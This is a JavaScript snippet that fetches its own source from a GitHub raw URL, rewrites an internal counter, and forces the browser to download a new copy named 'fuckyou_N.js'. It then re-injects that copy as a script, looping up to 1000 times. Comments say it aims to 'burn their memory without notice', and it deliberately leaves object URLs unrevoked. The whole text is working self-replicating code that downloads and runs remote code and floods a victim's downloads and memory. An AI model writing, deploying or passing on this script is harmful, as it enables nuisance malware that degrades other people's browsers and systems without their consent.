
(async function lobotomyScope() {


    const MAX_LOBOTOMIES = 1000;


    window.lobotoCounterRegister = typeof window.lobotoCounterRegister !== 'undefined' ? window.lobotoCounterRegister : 0;
    const currentCounter = window.lobotoCounterRegister;
    const futureSelf = currentCounter + 1;


    if (currentCounter >= MAX_LOBOTOMIES) {
        console.log(`%c[Engine] Execution halted. Reached max limit of ${MAX_LOBOTOMIES} files.`, "color: #ff4757; font-weight: bold;");
        return;
    }

    let source;


    if (window.lobotoSourceTextPayload) {
        source = window.lobotoSourceTextPayload;
    } else {
        try {
            // Using your exact raw content URL mapping for the baseline boot
            const fetched = await fetch(`https://raw.githubusercontent.com/barrettma00-droid/fuckyou_0/refs/heads/main/fuckyou_0.js`);
            if (!fetched.ok) throw new Error("CORS or target file network mismatch.");
            source = await fetched.text();
        } catch (e) {
            console.error("Could not fetch base script content:", e);
            return;
        }
    }


    const brainSynapses = source.replace(
        `let lobotoCounter = ${currentCounter};`,
        `let lobotoCounter = ${futureSelf};`
    );


    const file = new File([brainSynapses], `fuckyou_${futureSelf}.js`, {
        type: "text/javascript",
    });


    theSecondLobotomy(file, brainSynapses, futureSelf);

    async function theSecondLobotomy(capturedFile, mutatedText, nextId) {
        const capturedContent = await capturedFile.text();
        console.log(`Generated & Executing: ${capturedFile.name} (${nextId}/${MAX_LOBOTOMIES})`);

        //Comment this if you to burn their memory without notice
        downloadFile(capturedFile);


        theFinalLobotomy(mutatedText, nextId);
    }

    function downloadFile(download) {
        const url = URL.createObjectURL(download);
        const link = document.createElement("a");
        link.href = url;
        link.download = download.name;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    }

    async function theFinalLobotomy(string, nextId) {

        window.lobotoSourceTextPayload = string;
        window.lobotoCounterRegister = nextId;

        const blob = new Blob([string], { type: 'text/javascript'});
        const blobsPlace = URL.createObjectURL(blob);

        const theNeedle = document.createElement('script');
        theNeedle.src = blobsPlace;

        theNeedle.onload = () => {
            //Uncomment this if you want less suffering for your memory
            //URL.revokeObjectURL(blobsPlace);
        };

        document.head.appendChild(theNeedle);
    }

})();

